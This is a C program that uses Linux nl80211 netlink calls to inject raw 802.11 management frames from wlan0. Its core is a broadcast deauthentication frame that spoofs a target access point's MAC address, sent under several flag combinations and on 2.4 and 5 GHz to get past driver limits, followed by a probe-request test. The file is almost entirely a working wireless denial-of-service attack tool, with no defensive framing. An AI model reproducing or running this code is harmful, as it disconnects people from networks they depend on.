#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <linux/genetlink.h>
#include <net/if.h>
#include <errno.h>
#include <poll.h>

static int nl80211_family = -1;

static int get_nl80211_family(int sock) {
    struct {
        struct nlmsghdr hdr; struct genlmsghdr genl;
        struct nlattr attr; char name[16];
    } req = {0};
    req.hdr.nlmsg_len = sizeof(req);
    req.hdr.nlmsg_type = GENL_ID_CTRL;
    req.hdr.nlmsg_flags = NLM_F_REQUEST;
    req.hdr.nlmsg_seq = 1;
    req.genl.cmd = CTRL_CMD_GETFAMILY;
    req.hdr.nlmsg_pid = getpid();
    req.attr.nla_type = CTRL_ATTR_FAMILY_NAME;
    req.attr.nla_len = sizeof(req.attr) + 8;
    strcpy(req.name, "nl80211");
    req.hdr.nlmsg_len = sizeof(req.hdr) + sizeof(req.genl) + req.attr.nla_len;
    send(sock, &req, req.hdr.nlmsg_len, 0);
    unsigned char resp[4096];
    int len = recv(sock, resp, sizeof(resp), 0);
    if (len < 0) return -1;
    struct nlmsghdr *hdr = (struct nlmsghdr*)resp;
    if (hdr->nlmsg_type == NLMSG_ERROR) return -1;
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    struct nlattr *a = (struct nlattr*)(genl + 1);
    int rem = hdr->nlmsg_len - sizeof(*hdr) - sizeof(*genl);
    while (rem >= (int)sizeof(struct nlattr)) {
        if (a->nla_type == CTRL_ATTR_FAMILY_ID && a->nla_len >= sizeof(struct nlattr)+4)
            return *(int*)((char*)a + sizeof(struct nlattr));
        int al = ((a->nla_len + 3) & ~3); rem -= al;
        a = (struct nlattr*)((char*)a + al);
    }
    return -1;
}

static void add_attr_u32(unsigned char **ptr, int type, int val) {
    struct nlattr *a = (struct nlattr*)*ptr;
    a->nla_type = type;
    a->nla_len = sizeof(*a) + 4;
    *(int*)((char*)a + sizeof(*a)) = val;
    *ptr += a->nla_len;
}

static void add_attr_flag(unsigned char **ptr, int type) {
    struct nlattr *a = (struct nlattr*)*ptr;
    a->nla_type = type;
    a->nla_len = sizeof(*a);
    *ptr += a->nla_len;
}

static void add_attr_raw(unsigned char **ptr, int type, const unsigned char *data, int len) {
    struct nlattr *a = (struct nlattr*)*ptr;
    a->nla_type = type;
    a->nla_len = sizeof(*a) + len;
    memcpy((char*)a + sizeof(*a), data, len);
    *ptr += a->nla_len;
}

static int try_inject(int sock, int ifidx, int freq, const unsigned char *frame, int flen,
                      int offchan, int no_cck, int dont_wait) {
    unsigned char buf[1024];
    memset(buf, 0, sizeof(buf));
    struct nlmsghdr *hdr = (struct nlmsghdr*)buf;
    hdr->nlmsg_type = nl80211_family;
    hdr->nlmsg_flags = NLM_F_REQUEST;
    if (!dont_wait) hdr->nlmsg_flags |= NLM_F_ACK;
    hdr->nlmsg_seq = 100;
    hdr->nlmsg_pid = getpid();
    struct genlmsghdr *genl = (struct genlmsghdr*)(hdr + 1);
    genl->cmd = NL80211_CMD_FRAME;
    unsigned char *ptr = (unsigned char*)(genl + 1);
    add_attr_u32(&ptr, NL80211_ATTR_IFINDEX, ifidx);
    add_attr_u32(&ptr, NL80211_ATTR_WIPHY_FREQ, freq);
    add_attr_raw(&ptr, NL80211_ATTR_FRAME, frame, flen);
    if (offchan) add_attr_flag(&ptr, NL80211_ATTR_OFFCHANNEL_TX_OK);
    if (no_cck) add_attr_flag(&ptr, NL80211_ATTR_TX_NO_CCK_RATE);
    if (dont_wait) add_attr_flag(&ptr, NL80211_ATTR_DONT_WAIT_FOR_ACK);
    hdr->nlmsg_len = ptr - buf;
    
    int ret = send(sock, buf, hdr->nlmsg_len, 0);
    if (ret < 0) { printf("  send err: %s\n", strerror(errno)); return -1; }
    
    if (dont_wait) {
        // Check for async error
        struct pollfd pfd = {.fd = sock, .events = POLLIN};
        int pr = poll(&pfd, 1, 200);
        if (pr > 0) {
            unsigned char resp[256];
            recv(sock, resp, sizeof(resp), 0);
            struct nlmsghdr *rh = (struct nlmsghdr*)resp;
            if (rh->nlmsg_type == NLMSG_ERROR) {
                int e = ((struct nlmsgerr*)(rh+1))->error;
                printf("  async err: %d (%s)\n", e, e ? strerror(-e) : "ACK");
                return e;
            }
        }
        printf("  sent (no ack)\n");
        return 0;
    }
    
    unsigned char resp[256];
    int len = recv(sock, resp, sizeof(resp), 0);
    struct nlmsghdr *rh = (struct nlmsghdr*)resp;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        int e = ((struct nlmsgerr*)(rh+1))->error;
        printf("  err: %d (%s)\n", e, e ? strerror(-e) : "ACK/OK");
        return e;
    }
    printf("  ok (type=%d)\n", rh->nlmsg_type);
    return 0;
}

int main(int argc, char **argv) {
    int freq = argc >= 2 ? atoi(argv[1]) : 2427;
    const char *target = argc >= 3 ? argv[2] : "a0:6b:4a:60:b2:74";
    
    unsigned char ap[6];
    for (int i = 0; i < 6; i++) sscanf(target + i*3, "%2hhx:", &ap[i]);
    
    // Build CORRECT deauth frame
    // FC(2) | Duration(2) | RA(6) | TA(6) | BSSID(6) | SEQ(2) | Reason(2)
    unsigned char frame[26];
    memset(frame, 0, 26);
    frame[0] = 0xC0; frame[1] = 0x00;  // FC: Deauth
    frame[2] = 0x3A; frame[3] = 0x01;  // Duration
    // RA = broadcast (or specific client)
    unsigned char bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    memcpy(frame+4, bc, 6);            // RA
    memcpy(frame+10, ap, 6);           // TA (spoof AP)
    memcpy(frame+16, ap, 6);           // BSSID
    // SEQ at bytes 22-23 (leave 0)
    // Reason at bytes 24-25
    frame[24] = 7;  // Class 3 frame from nonassociated STA
    
    int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sock < 0) { perror("socket"); return 1; }
    struct sockaddr_nl sa = {.nl_family = AF_NETLINK, .nl_pid = getpid()};
    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
    nl80211_family = get_nl80211_family(sock);
    printf("nl80211 family: %d\n", nl80211_family);
    int ifidx = if_nametoindex("wlan0");
    printf("ifidx: %d\n", ifidx);
    
    printf("\n=== Fixed frame + various attribute combos ===\n");
    
    printf("\nTest 1: basic (no flags):\n");
    try_inject(sock, ifidx, freq, frame, 26, 0, 0, 0);
    
    printf("\nTest 2: with OFFCHANNEL_TX_OK:\n");
    try_inject(sock, ifidx, freq, frame, 26, 1, 0, 0);
    
    printf("\nTest 3: with NO_CCK_RATE:\n");
    try_inject(sock, ifidx, freq, frame, 26, 0, 1, 0);
    
    printf("\nTest 4: both flags:\n");
    try_inject(sock, ifidx, freq, frame, 26, 1, 1, 0);
    
    printf("\nTest 5: DONT_WAIT (no ack):\n");
    try_inject(sock, ifidx, freq, frame, 26, 0, 0, 1);
    
    // Also try on 5 GHz (same channel as current connection)
    printf("\nTest 6: on 5300 MHz + OFFCHANNEL:\n");
    try_inject(sock, ifidx, 5300, frame, 26, 1, 0, 0);
    
    // Try a probe request instead of deauth (less restricted)
    unsigned char probe[] = {
        0x40, 0x00, 0x00, 0x00,              // FC: Probe Request
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,        // DA: broadcast
        0x00,0x00,0x00,0x00,0x00,0x00,        // SA (random)
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,        // BSSID: wildcard
        0x00, 0x00,                            // SEQ
        0x00, 0x05, 't', 'e', 's', 't', '!'   // SSID IE
    };
    printf("\nTest 7: probe request (len=%zu):\n", sizeof(probe));
    try_inject(sock, ifidx, freq, probe, sizeof(probe), 1, 0, 0);
    
    close(sock);
    return 0;
}
